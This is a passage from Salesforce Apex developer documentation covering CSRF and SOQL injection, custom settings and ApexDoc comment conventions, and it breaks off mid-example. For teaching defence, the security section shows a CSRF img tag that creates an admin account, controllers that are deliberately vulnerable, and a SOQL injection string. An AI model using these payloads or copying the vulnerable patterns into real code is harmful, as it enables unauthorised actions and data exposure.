Formula tags can also be used to include platform object data. Although the data is taken directly from the user's organization, it must still be escaped before use to prevent users from executing code in the context of other users (potentially those with higher privilege levels). While these types of attacks must be performed by users within the same organization, they undermine the organization's user roles and reduce the integrity of auditing records. Additionally, many organizations contain data which has been imported from external sources and might not have been screened for malicious content. Cross-Site Request Forgery (CSRF) flaws are less a programming mistake and more a lack of a defense. For example, an attacker has a web page at `www.attacker.com` that could be any web page, including one that provides valuable services or information that drives traffic to that site. Somewhere on the attacker's page is an HTML tag that looks like this:

```apex
<img
src="http://www.yourwebpage.com/yourapplication/createuser?email=attacker@attacker.com&type=admin....."
```

```apex
height=1 width=1 />
```

In other words, the attacker's page contains a URL that performs an action on your website. If the user is still logged into your web page when they visit the attacker's web page, the URL is retrieved and the actions performed. This attack succeeds because the user is still authenticated to your web page. This attack is a simple example, and the attacker can get more creative by using scripts to generate the callback request or even use CSRF attacks against your AJAX methods. For more information and traditional defenses: http://www.owasp.org/index.php/Cross-Site_Request_Forgery http://www.cgisecurity.com/csrf-faq.html http://shiflett.org/articles/cross-site-request-forgeries Within the Lightning Platform, Salesforce implemented an anti-CSRF token to prevent such an attack. Every page includes a random string of characters as a hidden form field. Upon the next page load, the application checks the validity of this string of characters and doesn’t execute the command unless the value matches the expected value. This feature protects you when using all of the standard controllers and methods. Here again, the developer can bypass the built-in defenses without realizing the risk. For example, a custom controller takes the object ID as an input parameter and then uses that input parameter in a SOQL call.

```apex
<apex:page controller="myClass" action="{!init}"</apex:page>
```

```apex
public class myClass {
```

```apex
public void init() {
Id id = ApexPages.currentPage().getParameters().get('id');
Account obj = [select id, Name FROM Account WHERE id = :id];
delete obj;
return ;
}
}
```

The developer unknowingly bypassed the anti-CSRF controls by developing their own action method. The `id` parameter is read and used in the code. The anti-CSRF token is never read or validated. An attacking web page can send the user to this page by using a CSRF attack and providing any value for the `id` parameter. There are no built-in defenses for such situations, and developers must be cautious about writing pages that act based on a user-supplied parameter like the `id` variable in the previous example. A possible work-around is to insert an intermediate confirmation page to make sure that the user intended to call the page. Other suggestions include shortening the idle session timeout and educating users to log out of their active session and not use their browser to visit other sites while authenticated. Because of the Salesforce built-in defense against CSRF, your users can encounter an error when multiple Salesforce login pages are open. If the user logs in to Salesforce in one tab and then attempts to log in on another, they see this error: The page you submitted was invalid for your session. Users can successfully log in by refreshing the login page or by attempting to log in a second time. In other programming languages, the previous flaw is known as SQL injection. Apex doesn’t use SQL, but uses its own database query language, SOQL. SOQL is simpler and more limited in functionality than SQL. The risks are lower for SOQL injection than for SQL injection, but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in a dynamic SOQL query. If the input isn’t validated, it can include SOQL commands that effectively modify the SOQL statement and trick the application into performing unintended commands. SOQL Injection Vulnerability in Apex Here’s a simple example of Apex and Visualforce code vulnerable to SOQL injection.

```apex
<apex:page controller="SOQLController" >
```

```apex
<apex:form>
```

```apex
<apex:outputText value="Enter Name" />
<apex:inputText value="{!name}" />
<apex:commandButton value="Query" action="{!query}“ />
</apex:form>
</apex:page>
public class SOQLController {
```

```apex
public String name {
get { return name;}
set { name = value;}
}
public PageReference query() {
```

```apex
String qryString = 'SELECT Id FROM Contact WHERE ' +
```

```apex
'(IsDeleted = false and Name like \'%' + name + '%\')';
List<Contact> queryResult = Database.query(qryString);
System.debug('query result is ' + queryResult);
return null;
}
}
```

This simple example illustrates the logic. The code is intended to search for contacts that weren’t deleted. The user provides one input value called `name` . The value can be anything provided by the user, and it’s never validated. The SOQL query is built dynamically and then executed with the `Database.query` method. If the user provides a legitimate value, the statement executes as expected.

```apex
// User supplied value: name = Bob
// Query string
SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')
```

But what if the user provides unexpected input, such as:

```apex
// User supplied value for name: test%') OR (Name LIKE '
```

In that case, the query string becomes:

```apex
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
```

Now the results show all contacts, not just the non-deleted ones. A SOQL Injection flaw can be used to modify the intended logic of any vulnerable query. SOQL Injection Defenses To prevent a SOQL injection attack, avoid using dynamic SOQL queries. Instead, use static queries and binding variables. The preceding vulnerable example can be rewritten using static SOQL.

```apex
public class SOQLController {
```

```apex
public String name {
get { return name;}
set { name = value;}
}
public PageReference query() {
```

```apex
String queryName = '%' + name + '%';
List<Contact> queryResult = [SELECT Id FROM Contact WHERE
(IsDeleted = false and Name like :queryName)];
System.debug('query result is ' + queryResult);
return null;
}
}
```

If you must use dynamic SOQL, use the `escapeSingleQuotes` method to sanitize user-supplied input. This method adds the escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead of database commands. The Salesforce Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users can read, create, edit, and delete. These settings are enforced when using all standard controllers. When using an Apex class, the default behavior is tp respect built-in user permissions and field-level security restrictions during execution, that is, as if the class were declared as `with` `sharing` . For example, consider this Apex pseudo-code.

```apex
public class customController {
```

```apex
public void read() {
Contact contact = [SELECT id FROM Contact WHERE Name = :value];
}
}
```

In this case, only contact records for the current user are searched. The platform uses the security sharing permissions of the user currently logged in, rather than granting full access to all records.

### Custom Settings

Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for an organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access without the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this data. Protection only applies to custom settings that are marked protected and installed to a subscriber organization as part of a managed package. Otherwise, they are treated as public custom settings and are readable for all profiles, including the guest user. Do not store secrets, personally identifying information, or any private data in these settings. Use protected custom settings only in managed packages. Outside of a managed package, use named credentials or encrypted custom fields to store secrets like OAuth tokens, passwords, and other confidential material. While custom settings data is included in sandbox copies, it is treated as data for the purposes of Apex test isolation. Apex tests must use `SeeAllData=` `true` to see existing custom settings data in the organization. As a best practice, create the required custom settings data in your test setup. There are two types of custom settings. **List Custom Settings** A type of custom setting that provides a reusable set of static data that can be accessed across your organization. If you use a particular set of data frequently within your application, putting that data in a list custom setting streamlines access to it. Data in list settings doesn’t vary with profile or user, but is available organization-wide. Examples of list data include two-letter state abbreviations, international dialing prefixes, and catalog numbers for products. Because the data is cached, access is low-cost and efficient: you don't have to use SOQL queries that count against your governor limits. **Hierarchy Custom Settings** A type of custom setting that uses a built-in hierarchical logic that lets you “personalize” settings for specific profiles or users. The hierarchy logic checks the organization, profile, and user settings for the current user and returns the most specific, or “lowest,” value. In the hierarchy, settings for an organization are overridden by profile settings, which, in turn, are overridden by user settings. To get custom setting data set record based on the lowest level fields defined in the hierarchy, use the `getinstance()` instance method for hierarchy custom settings. The following examples illustrate how you can use custom settings. A shipping application requires users to fill in the country codes for international deliveries. By creating a list setting of all country codes, users have quick access to this data without needing to query the database. An application displays a map of account locations, the best route to take, and traffic conditions. This information is useful for sales reps, but account executives only want to see account locations. By creating a hierarchy setting with custom checkbox fields for route and traffic, you can enable this data for just the “Sales Rep” profile. You can create a custom setting in the Salesforce user interface: from Setup, enter `Custom` `Settings` in the Quick Find box, then select **Custom Settings** . After creating a custom setting and you’ve added fields, provide data to your custom setting by clicking **Manage** from the detail page. Identify each data set with a name. For example, if you have a custom setting named Foundation_Countries__c with one text field Country_Code__c, your data sets can look like the following: Country Code Field Value Data Set Name USA United States CAN Canada GBR United Kingdom You can also include a custom setting in a package. The visibility of the custom setting in the package depends on the `Visibility` setting. Only custom settings definitions are included in packages, not data. To include data, you must populate the custom settings using Apex code run by the subscribing organization after they’ve installed the package. Apex can access both custom setting types—list and hierarchy. If **Privacy** for a custom setting is `Protected` and the custom setting is contained in a managed package, the subscribing organization can’t edit the values or access them using Apex.

#### Accessing a List Custom Setting

The following example returns a map of custom settings data. The `getAll` method returns values for all custom fields associated with the list setting.

```apex
Map<String_dataset_name, CustomSettingName__c> mcs = CustomSettingName__c.getAll();
```

The following example uses the `getValues` method to return all the field values associated with the specified data set. This method can be used with both list and hierarchy custom settings, using different parameters.

```apex
CustomSettingName__c mc = CustomSettingName__c.getValues(data_set_name);
```

#### Accessing a Hierarchy Custom Setting

The following example uses the `getOrgDefaults` method to return the data set values for the organization level:

```apex
CustomSettingName__c mc = CustomSettingName__c.getOrgDefaults();
```

The following example uses the `getInstance` method to return the data set values for the specified profile. The `getInstance` method can also be used with a user ID.

```apex
CustomSettingName__c mc = CustomSettingName__c.getInstance(Profile_ID);
```

Apex Reference Guide : Custom Settings Methods

## Document Your Apex Code

ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability. Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex and the Salesforce ecosystem. ApexDoc Comment Structure and Tags To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists of a main description and a set of block and inline tags that provide information about the documented code element. Document Apex Constructs and Features Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines to document these elements with ApexDoc. ApexDoc Examples See practical examples of ApexDoc comments applied to various Apex constructs.

### ApexDoc Comment Structure and Tags

To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists of a main description and a set of block and inline tags that provide information about the documented code element. Although the Apex compiler enforces existing Apex comment syntax on page 50, it doesn’t enforce the ApexDoc syntax or check comment accuracy in relation to corresponding Apex code.

#### Basic Comment Format

ApexDoc comments are distinguished from other Apex comments on page 50 by their starting delimiter. Whereas other multiline comments demarcate the beginning and end of the comment block with `/*` and `*/` , ApexDoc comments begin with /** and end with */. An ApexDoc comment immediately precedes the class, interface, enum, method, constructor, or property declaration that it documents. No other code or comments are between the ApexDoc comment block and the element that it describes. If an ApexDoc comment spans multiple lines, each subsequent line begins with an asterisk ( `*` ). Documentation parsers ignore the leading asterisk and any whitespace that precedes it on the line.

```apex
/**
* This is a simple ApexDoc comment.
*/
public with sharing class MyClass {
```

```apex
//...
}
```

#### Main Description

The main description is the first block of text within an ApexDoc comment. It doesn’t have an explicit tag. It provides a concise summary of the documented element. In the main description, first include a one-sentence summary of the element. Documentation generation tools often extract this first sentence to use in summary tables or indexes. End the summary sentence with a period. After the summary sentence, include any additional context about the element. For example, explain pre- or post- conditions, link to relevant documents, or describe variable constraints.

#### Block and Inline Tags

Block tags and inline tags provide structured information about the element. Use block tags after the main description of the ApexDoc comment. Block tags begin with the `@` symbol followed by the tag name, such as `@param` , `@` `return` , and `@author` . Each block tag appears on a new line, and the information associated with a block tag follows the tag name on the same line or subsequent lines. Use inline tags within the main description or within the description of a block tag. Inline tags also begin with the `@` symbol followed by the tag name, but the tags are enclosed in curly braces ( `{@...}` ). This table provides a comprehensive ApexDoc tag reference. **Table 3: ApexDoc Tags** Specifies the author or authors of the element code. Multiple `@author` tags are allowed.

```apex
* @author Marie Hill
* @author Ben Stuar
```

Class, Interface, Enum `@author` `value` Marks an element as deprecated. In the tag description, provide a reason and an alternative.

```apex
* @deprecated in 1.3.2.
* Use {@link #newFieldName} instead.
```

All `@deprecated` `description` Provides a usage example. The example is formatted as code if the `{@code` `…` `}` inline tag is used.

```apex
* @example
* {@code
```

All `@example` `example`

```apex
* Account a;
* try {
*
a = new
AccountManager().createAccount('Acme',
'Agriculture');
* } catch (AccountManager.AccountException
caught) {
*
LOGGER.log(caught);
*
// further exception handling
* }
* }
```

Specifies the element’s group in documentation. Grouping elements is useful for generated documentation.

```apex
* @group Account
```

Class, Interface, Enum, Method, Property, Variable `@group` `groupName` Describes a method or constructor parameter. It must match the parameter order and name.

```apex
* @param accountName The desired name for
the new
* account. Cannot be null or empty.
```

Method, Constructor `@param` `paramName` Describes the return value of a method. Don’t use the `@` `return` tag for void methods or constructors.

```apex
* @return The newly created Account sObject
with its
* ID populated.
```

Method `@` `return` `description` Adds a reference in the See Also section of the documentation. All `@see` `reference` The `@see` tag allows these syntaxes.

```apex
•
@see class#member
```

```apex
•
@see "text-string"
```

```apex
•
@see <a href="URL">label</a>
```

For the `@see` `class` `#` `member` syntax: `class` —The fully-qualified name of the class or interface that you want to link to. `#` `member` —The specific member within a class that you want to link to. For example, For fields or properties, use `#` `fieldName` . For constructors, use `#` `ClassName` `(` `parameterTypes` `)` . For methods, use `#` `methodName` `(` `parameterTypes` `)` . The `parameterTypes` are important to distinguish overloaded methods. Use the fully-qualified name for the parameter types if they’re from a different package.

```apex
* @see GeolocationService#GeocodingException
```

Indicates the version or date that the element was introduced. This tag is particularly useful for package authors.

```apex
* @since 0.1.0
```

All `@since` `value` Documents an exception that can be thrown.

```apex
* @throws AccountManager.AccountException
if
```

Method, Constructor `@throws` `exceptionType` `description`

```apex
* accountName is invalid or if DML operation
fails.
```

Specifies the version of the element.

```apex
* @version 0.2.0
```

Class, Interface, Enum `@version` `value` Formats comment text as inline code.

```apex
* {@code
* Account a;
```

ApexDoc comment `{@code` `text` `}`

```apex
* try {
*
a = new
AccountManager().createAccount('Acme',
'Agriculture');
* } catch (AccountManager.AccountException
caught) {
*
LOGGER.log(caught);
*
// further exception handling
* }
* }
```

Prevents an element from appearing in generated docs.

```apex
* {@hidden NOTE TO MAINTAINERS: Update this
method
```

All `{@hidden` `text` `}`

```apex
* if new security threats are identified.
* The current regex is designed to handle
common XSS
* patterns but may not be exhaustive.
* The last major update was in v2.1.}
```

Creates an inline link to another element. The `@link` tag allows these syntaxes. ApexDoc comment `{@link` `reference` `}`

```apex
•
@link class#member
```

```apex
•
@link "text-string"
```

```apex
•
@link <a href="URL">label</a>
```

For the `@link` `class` `#` `member` syntax: `class` —The fully-qualified name of the class or interface that you want to link to. `#` `member` —The specific member within a class that you want to link to. For example, For fields or properties, use `#` `fieldName` . For constructors, use `#` `ClassName` `(` `parameterTypes` `)` . For methods, use `#` `methodName` `(` `parameterTypes` `)` . The `parameterTypes` are important to distinguish overloaded methods. Use the fully-qualified name for the parameter types if they’re from a different package.

```apex
* Populated after using the {@link
AccountService}.
```

Shows text literally without HTML tag interpretation.

```apex
* This string might contain malicious or
unexpected characters,
```

ApexDoc comment `{@literal` `text` `}`

```apex
* like a {@literal <script>} tag or a
backslash {@literal \}.
```

Document Apex Constructs and Features ApexDoc Examples

### Document Apex Constructs and Features

Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines to document these elements with ApexDoc.

#### Classes

When you document an Apex class on page 62, provide a comprehensive overview of the class’s purpose, responsibilities, and key characteristics. In the summary sentence, describe the class’s overall purpose. After the summary sentence, explain the rationale for the class’s sharing model on page 90 if it’s not obvious. For example, explain why the class uses `without` `sharing` for a specific privileged operation. We also recommend using tags such as `@author` , `@version` , `@since` , `@see,` and `@group` , which all provide valuable metadata. Here’s an example ApexDoc comment for the `DataAggregationService` class.

```apex
/**
* This service class handles critical data aggregation tasks.
* It operates using 'without sharing' to ensure access to all necessary
* records for calculation, irrespective of the running user's sharing rules.
* Care must be taken when calling methods from this class.
* @author Jane Doe
* @since 0.1.0
*/
public without sharing class DataAggregationService {
```

```apex
//...
}
```

#### Interfaces

Apex interfaces on page 82 define a contract for what other classes can do without specifying how they do it. Focus your ApexDoc comments on this contract. In the main description, document the interface’s overall purpose and the contract that it defines. Standard metadata tags such as `@author` , `@version` , `@since` , and `@see` are also applicable. Document each method declaration in the interface as a standard method. Clearly explain the method’s expected behavior, parameters, and return values. This documentation sets expectations for any class that implements the interface. For an example of an interface with an ApexDoc comment, see ApexDoc Examples on page 252.

#### Enums

Enums on page 34 in Apex define an abstract data type with a finite set of named constant values. In the main description, document the enum’s purpose and the set of concepts that it represents. You can also use standard tags such as `@author` , `@version` , `@since` , and `@see` . Clarify individual enum constants if their names aren’t self-explanatory. Either describe a constant’s definition in the enum type’s ApexDoc main description, or use standard block comments that directly precede the line for the constant. Apex enums implicitly include methods such as `values()` , `valueOf(` `String` `)` , `name()` , and `ordinal()` . These standard methods generally don’t require explicit documentation within each specific enum’s ApexDoc comment. Here’s an example ApexDoc comment for the `Season` enum.

```apex
/**
* Potential seasons of the year
*/
public enum Season {
WINTER,
SPRING,
SUMMER,
FALL
}
```

#### Methods and Constructors

Method on page 65 and constructor on page 68 documentation is critical for understanding how to use an Apex class. When you document method and constructor parameters, use the `@param` block tag. Each parameter must have a corresponding `@param` tag. In the parameter description, describe the parameter’s name, its purpose, and any expectations regarding its type or content. Descriptions can include statements such as “Cannot be null” or “A valid 18-character ID”. For methods that return values, use the `@` `return` block tag. In the description, specify what is returned, including conditions for null values or specific data structures. Descriptions can include statements such as “A List of Account sObjects matching the filter criteria; an empty list if no matches are found.” Use the `@throws` block tag to list all significant checked and unchecked exceptions that the method can explicitly throw, along with the conditions causing them. This documentation is crucial for identifying gaps in error handling. For examples of methods and constructors with ApexDoc comments, see ApexDoc Examples on page 252.

#### Properties and Variables

Document public or global properties and class member variables that form part of a class’s public API. In the ApexDoc comment’s main description section, explain the property’s purpose, its data type if it’s unclear from the method declaration, and any important usage notes. For example, include whether the property is read-only after initialization, or its default value. Block tags such as `@see` , `@since` , and `@deprecated` can also be applicable. Here’s an example ApexDoc comment for the public `maxRetries` variable.

```apex
/**
* Stores the maximum number of retry attempts for an operation.
* Defaults to 3 if not explicitly set.
* @since 0.1.1
*/
public Integer maxRetries {
get {
```

```apex
return maxRetries ?? 3;
}
set { maxRetries = value; }
}
```

#### Triggers

Apex triggers on page 265 are event-driven pieces of code that execute in response to specific database operations. Apex trigger definitions provide significant context, so we strongly recommend that you delegate all business logic to a separate handler class or a trigger framework. Therefore, ApexDoc doesn’t have any trigger-specific comment specifications. However, you can still include standard ApexDoc tags such as `@since` and `@see` . For example, here’s a ApexDoc comment for the `Opportunity` trigger.

```apex
/**
* @since 1.3.2
*/
trigger OpportunityTrigger on Opportunity (
before insert,
after insert,
before update,
after update,
before delete,
after delete,
after undelete
) {
```

```apex
new OpportunityTriggerHandler().run();
}
```

#### Annotations

Apex annotations on page 92, such as `@AuraEnabled` and `@Future` , modify the way a class or method is used by the platform and other code. For an element that has an annotation, document the implications of that annotation for the element’s behavior or usage. Refer to this table as you write ApexDoc comments for elements with Apex annotations. **Table 4: Document Common Apex Annotations** If the element is exposed to Lightning components for client-side access, document whether `(cacheable=` `true` `)` . Describe the implications of this cache setting. `@AuraEnabled` on page 94 If the element is callable from Flow Builder, explain the element’s function as an invocable action. Mention `label` and `description` attributes from the annotation if they `@InvocableMethod` on page 96 provide important context. Use `@param` and `@return` for the element’s specific input and output structure. Clarify the variable’s specific role, data type, and any constraints or expectations for the action. `@InvocableVariable` on page 102 Describe the overall resource. Also document the annotated Apex REST methods ( `@HttpDelete` , `@HttpGet` , `@HttpPatch,` `@HttpPost` , or `@HttpPut` ) with their specific roles. `@RestResource(urlMapping=...)` on page 117 Include the `@deprecated` tag. Explain the reason for the deprecation and specify the recommended alternative. `@Deprecated` on page 94 Describe the implications of running the method asynchronously. For example, you can specify whether the method runs in a separate transaction, describe governor limit considerations, and explain callout behavior. `@Future` on page 95 Briefly describe the scenario or functionality being tested. Test documentation is often excluded from public API docs. If `seeAllData` is `true` , explain why this setting is necessary. If `onInstall` is `true` , explain why this setting is necessary. `@IsTest` on page 106 Explain if the element is used for performance with large query sets or specific APIs. `@ReadOnly` on page 113 Describe the common test data being created. `@TestSetup` on page 115 Describe the rationale for the element’s annotation. For example, on private or protected member methods or variables, document “Visibility modified for testing purposes.” `@TestVisible` on page 116 Specify the warning that the third-party tool suppresses and briefly explain the rationale for the suppression if it’s not self-evident. `@SuppressWarnings` on page 115 Clarify if this annotation restricts exposure compared to global access or why this level of access is appropriate. `@NamespaceAccessible` on page 112 ApexDoc Comment Structure and Tags ApexDoc Examples

### ApexDoc Examples

See practical examples of ApexDoc comments applied to various Apex constructs.

#### Class Example

```apex
/**
* Manages customer account information and related operations.
* This class bypasses user record access via 'without sharing' so that it
* can be used in a batch classes.
* @author John Developer
* @since 0.1.0
* @version 0.3.1
* @see AccountProcessingBatch
* @group Account
* @example
* {@code
* Account a;
* try {
*
a = new AccountManager().createAccount('Acme', 'Agriculture');
* } catch (AccountManager.AccountException caught) {
```

```apex
*
LOGGER.log(caught);
*
// further exception handling
* }
* }
*/
public without sharing class AccountManager {
```

```apex
/**
* The default region for new accounts if not specified.
*/
public static final String DEFAULT_REGION = 'North America';
```

```apex
/**
* Stores the count of active accounts managed by this instance.
* Populated after using the {@link AccountService}.
*/
@TestVisible
private Integer activeAccountCount;
```

```apex
/**
* Creates a new Account sObject with the given name and industry.
* @param accountName The desired name for the new account. Cannot be null or empty.
* @param industry The industry classification for the new account.
* @return The newly created Account sObject with its ID populated.
* @throws AccountManager.AccountException if accountName is invalid
* or if DML operation fails.
*/
public Account createAccount(String accountName, String industry) {
```

```apex
if (String.isBlank(accountName)) {
```

```apex
throw new AccountManager.AccountException('Account name cannot be blank.');
}
Account acc = new Account(Name = accountName, Industry = industry);
// Potentially more logic here
try {
```

```apex
insert acc;
} catch (DmlException e) {
```

```apex
throw new AccountManager.AccountException(
```

```apex
'Failed to create account: ' + e.getMessage()
);
}
return acc;
}
```

```apex
// more methods...
```

```apex
/**
* Represents an exception specific to AccountManager operations.
* @example
* {@code
* throw new AccountManager.AccountException('Account not found with provided Id.');
* }
*/
public class AccountException extends Exception {}
}
```

#### Packaged Class Example

```apex
/**
* Provides services for geolocation and address conversion.
* @author Dennis Smith
* @version 0.3.0
* @since 0.1.0
*/
global with sharing class GeolocationService {
```

```apex
/**
* Represents geographic coordinates (latitude and longitude).
*/
global class Coordinates {
@AuraEnabled
public Decimal latitude;
@AuraEnabled
public Decimal longitude;
```

```apex
global Coordinates(Decimal lat, Decimal lon) {
```

```apex
this.latitude = lat;
this.longitude = lon;
}
}
```

```apex
/**
* Converts a full address string to approximate latitude
* and longitude coordinates. This method is deprecated and should no
* longer be used due to its reliance on an older, less accurate geocoding
* service and simpler parsing logic. It may not handle all address formats
* correctly and has a lower success rate.
* @param fullAddress The complete address string
* (e.g., "123 Main St, Anytown, CA 90210, USA").
* @return A `Coordinates` object representing the approximate latitude and longitude.
* @throws DeprecatedMethodCalledException If this method is invoked,
* informing the user to migrate to the newer, more robust `geocodeAddress` method.
* @deprecated in 0.2.0. Use {@link #geocodeAddress(
* String street,
* String city,
* String state,
* String postalCode,
* String country)} instead.
* @since 0.1.0
*/
@Deprecated
global static Coordinates convertAddressToCoordinates(String fullAddress) {
```

```apex
throw new DeprecatedMethodCalledException(
```

```apex
'The method `GeolocationService.convertAddressToCoordinates(String fullAddress)` is
deprecated. ' +
```

```apex
'Please use `GeolocationService.geocodeAddress(String street, String city, String
state, String postalCode, String country)` ' +
```

```apex
'for all new and existing address-to-coordinate conversions to ensure better
accuracy and reliability.'
```

```apex
);
}
```

```apex
/**
* Geocodes a structured address into precise latitude and longitude coordinates
* using a robust external geocoding service.
* This method provides higher accuracy and better handling of diverse address formats.
```

```apex
* @param street The street address (e.g., "123 Main St").
* @param city The city (e.g., "Anytown").
* @param state The state or province abbreviation (e.g., "CA").
* @param postalCode The postal or ZIP code (e.g., "90210").
* @param country The country name or code (e.g., "USA").
* @return A Coordinates object containing the latitude and longitude.
* @throws GeocodingException If the address cannot be geocoded,
* if the external service is unavailable, or if required address
* components are missing.
* @example
* {@code
* try {
*
GeolocationService.Coordinates coords = GeolocationService.geocodeAddress(
*
'415 Mission St',
*
'San Francisco',
*
'CA',
*
'94105',
*
'USA'
*
);
* } catch (GeolocationService.GeocodingException e) {
*
// handle failure
* }
* }
* @since 0.2.0
*/
global static Coordinates geocodeAddress(
```

```apex
String street,
String city,
String state,
String postalCode,
String country
) {
```

```apex
// Implement actual geocoding logic
return new Coordinates(0, 0);
}
```

```apex
/**
* Exception thrown when a deprecated method is called.
* This indicates that the caller should migrate to the recommended alternative.
*/
global class DeprecatedMethodCalledException extends Exception {
}
```

```apex
/**
* Exception thrown when a geocoding operation fails.
* This provides specific context for issues during address-to-coordinate conversion.
*/
global class GeocodingException extends Exception {
```

```apex
}
}
```

#### Test Class Example

```apex
/**
* Specifications for the GeolocationService
* @author Jane Devington
* @version 0.2.0
* @see GeolocationService
* @since 0.1.0
*/
@IsTest
private class GeolocationServiceTest {
```

```apex
/**
* Verifies that known addresses are correctly geocoded to their expected coordinates.
* @see GeolocationService#geocodeAddress(
* String street,
* String city,
* String state,
* String postalCode,
* String country)
*/
@IsTest
private static void validAddressShouldReturnCorrectCoordinates() {
```

```apex
String street = '415 Mission Street';
String city = 'San Francisco';
String state = 'CA';
String postalCode = '94105';
String country = 'USA';
```

```apex
GeolocationService.Coordinates coords;
Test.startTest();
coords = GeolocationService.geocodeAddress(
street,
city,
state,
postalCode,
country
);
Test.stopTest();
```

```apex
Assert.isNotNull(
coords,
'Coordinates should not be null for a valid address.'
);
Assert.areEqual(
37.785834,
coords.latitude,
'Latitude should match for Salesforce tower.'
);
Assert.areEqual(
-122.406417,
```

```apex
coords.longitude,
'Longitude should match for Salesforce tower.'
);
}
```

```apex
/**
* Verifies that calling the geocodeAddress with missing required parameters
* throws a GeocodingException.
* @see GeolocationService#geocodeAddress(
* String street,
* String city,
* String state,
* String postalCode,
* String country)
* @see GeolocationService#GeocodingException
*/
@IsTest
private static void missingRequiredParametersShouldThrowGeocodingException() {
```

```apex
String street = ''; // Missing
String city = 'San Francisco';
String state = 'CA';
String postalCode = 94105;
String country = 'USA';
```

```apex
Test.startTest();
Boolean caughtException = false;
try {
GeolocationService.geocodeAddress(
street,
city,
state,
postalCode,
country
);
} catch (GeolocationService.GeocodingException e) {
caughtException = true;
Assert.areEqual(
```

```apex
'Street, City, and Postal Code are required for geocoding.',
e.getMessage(),
'Exception message should indicate missing required fields.'
);
}
Test.stopTest();
```

```apex
Assert.isTrue(
caughtException,
'GeocodingException should have been thrown for missing street.'
);
}
```

```apex
/**
* Verifies that calling the deprecated method throws a
* DeprecatedMethodCalledException.
* @see GeolocationService#convertAddressToCoordinates(String address)
```

```apex
* @see GeolocationService#DeprecatedMethodCalledException
*/
@IsTest
private static void deprecatedMethodCallShouldThrowDeprecatedMethodCalledException() {
```

```apex
String oldAddress = '123 Deprecated Lane';
```

```apex
Test.startTest();
Boolean caughtException = false;
try {
GeolocationService.convertAddressToCoordinates(
oldAddress
);
} catch (GeolocationService.DeprecatedMethodCalledException e) {
caughtException = true;
Assert.isTrue(
e.getMessage().contains('is deprecated'),
'Exception message should indicate deprecation.'
);
Assert.isTrue(
e.getMessage().contains('Please use'),
'Exception message should suggest new method.'
);
}
Test.stopTest();
```

```apex
Assert.isTrue(
caughtException,
'DeprecatedMethodCalledException should have been thrown.'
);
}
}
```

#### Interface Example

```apex
/**
* Defines a contract for objects that can be serialized to a
* specific format. Implementations must provide logic for converting
* their state into a string representation.
* @author Jane Coder
* @since 0.2.0
*/
public interface ISerializable {
```

```apex
/**
* Serializes the object's current state into a String.
* @return A String representation of the object.
* @throws SerializationException if the object cannot be serialized.
*/
String serialize();
```

```apex
/**
* Gets the format name this serializer supports (e.g., "JSON", "XML").
* @return The name of the serialization format.
*/
```

```apex
String getFormatName();
}
```

#### Enum Example

```apex
/**
* Represents the possible status levels for a support case.
* Defines standard values for case progression in the customer portal.
* @author John Developer
* @since 0.1.5
*/
public enum CaseStatus {
```

```apex
/* A newly opened case, not yet assigned. */
BRAND_NEW,
/* Case is actively being worked on. */
WORKING,
/* Case has been escalated to a higher tier. */
ESCALATED,
/* Case has been resolved and closed. */
CLOSED
}
```

#### Method Example (with params, return, throws)

```apex
/**
* Calculates the total price for a list of products, applying a discount.
* @param productCodes A List of unique product codes to calculate the price for.
* Each code must correspond to an existing Product2 record.
* @param discountPercentage The discount percentage to apply (e.g., 10.5 for 10.5%).
* Must be between 0.0 and 100.0.
* @return The calculated total price as a Decimal after applying the discount.
* Returns 0.0 if productCodes is null or empty.
* @throws InvalidArgumentException if discountPercentage is out of range.
* @throws ProductNotFoundException if any productCode does not match an
* existing product.
*/
public Decimal calculateTotalPrice(
List<String> productCodes,
Decimal discountPercentage
) {
```

```apex
if (discountPercentage < 0.0 || discountPercentage > 100.0) {
```

```apex
throw new IllegalArgumentException(
```

```apex
'Discount percentage must be between 0.0 and 100.0.'
);
}
if (productCodes == null || productCodes.isEmpty()) {
```

```apex
return 0.0;
}
//... implementation logic to fetch prices and calculate total...
return 100.0;
}
```

```apex
/**
```

```apex
* Represents an exception thrown when a requested product cannot be found.
* This custom exception provides a clear indication that a product lookup failed,
* allowing calling code to handle the 'not found' scenario specifically.
* It is typically thrown by methods attempting to retrieve Product2 records.
* @example
* {@code
* List<Product2> products = [
*
SELECT Id
*
FROM Product2
*
WHERE ProductCode = :productCode
*
LIMIT 1
* ];
* if (products.isEmpty()) {
*
throw new ProductNotFoundException(
*
'Product with code ' + productCode + ' not found.'
*
);
* }
* }
*/
public class ProductNotFoundException extends Exception {}
```

#### Annotated Method (@AuraEnabled) Example

```apex
public class OpportunityService {
```

```apex
/**
* Retrieves a list of open opportunities for a given account,
* accessible from Lightning Web Components. If the set of open opportunities
* can change during interaction with the component, the author will
* need to use {@code refreshApex()}.
* @param accountId The ID of the Account to retrieve opportunities for.
* @return A List of open Opportunity records. Returns an empty list if no
* open opportunities are found or if accountId is invalid.
* @see OpportunitySelector
*/
@AuraEnabled(cacheable=true)
public static List<Opportunity> getOpenOpportunities(Id accountId) {
List<Opportunity> result = new List<Opportunity>();
//... implementation details...
return result;
}
}
```

#### External Reference Example

```apex
/**
* Provides a service to retrieve current weather conditions from an external API.
* It utilizes Salesforce Named Credentials for secure endpoint and
* authentication management.
* @author John Doe
* @since 1.0.3
*/
public with sharing class WeatherService {
```

```apex
/**
```

```apex
* Retrieves the current weather conditions for a specified city and country.
* This method makes an HTTP GET callout to an external weather API using a
* Named Credential.
* @param city The name of the city (e.g., "London").
